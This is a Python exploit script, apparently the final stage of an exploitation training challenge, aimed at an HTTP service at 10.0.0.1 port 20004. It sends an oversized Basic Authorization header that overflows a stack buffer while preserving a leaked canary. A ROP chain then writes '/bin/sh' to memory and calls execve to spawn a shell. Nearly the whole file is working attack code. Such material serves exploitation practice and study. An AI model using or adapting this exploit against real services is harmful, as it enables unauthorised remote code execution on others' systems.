#!/usr/bin/env python
import socket
import base64
import time
import string
import random
import struct

# final stage: secret, canary, leaked infos

TCP_IP = '10.0.0.1'
TCP_PORT = 20004
BUFFER_SIZE = 1024

def create_http_request(uri, password):
	request = "GET "+uri+" HTTP/1.0\nAuthorization: Basic "+base64.b64encode(password)+"\n\n"
	return request

base = 0xb7649000
stackbase = 0xbfeec000
canary = "\x00\xf5\xd4\x20"
ebx = "CCCC"

stack  = struct.pack("<I", base + 0xe0096) # pop %edx | pop %ecx | pop %ebx|ret
stack += struct.pack("<I", 0xdeadbeef) # junk
stack += struct.pack("<I", stackbase) # writable address (beggining stack)
stack += struct.pack("<I", 0xdeadbeef) # junk
stack += struct.pack("<I", base + 0x238df) # pop %eax | ret
stack += "/bin" # junk
stack += struct.pack("<I", base + 0x6cc5a) # mov %eax,(%ecx) | ret

stack += struct.pack("<I", base + 0xe0096) # pop %edx | pop %ecx | pop %ebx|ret
stack += struct.pack("<I", 0xdeadbeef) # junk
stack += struct.pack("<I", stackbase + 4) # writable address (beggining stack)
stack += struct.pack("<I", 0xdeadbeef) # junk
stack += struct.pack("<I", base + 0x238df) # pop %eax | ret
stack += "/sh\x00" # junk
stack += struct.pack("<I", base + 0x6cc5a) # mov %eax,(%ecx) | ret

stack += struct.pack("<I", base + 0x9b910) # execve
stack += struct.pack("<I", base + 0x329e0) # exit
stack += struct.pack("<I", stackbase) # writable address (beggining stack)
stack += struct.pack("<I", 0x0) # writable address (beggining stack)
stack += struct.pack("<I", 0x0) # writable address (beggining stack)


password = "PC1fysF7wbnh8vU0" + "A"*2032 + canary + "A"*12 + ebx + "B"*12 + stack
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
httprequest = create_http_request("/./", password)
print httprequest
s.send(httprequest)
while True:
	data = s.recv(BUFFER_SIZE)
	if not data:
		break
	print data
s.close()

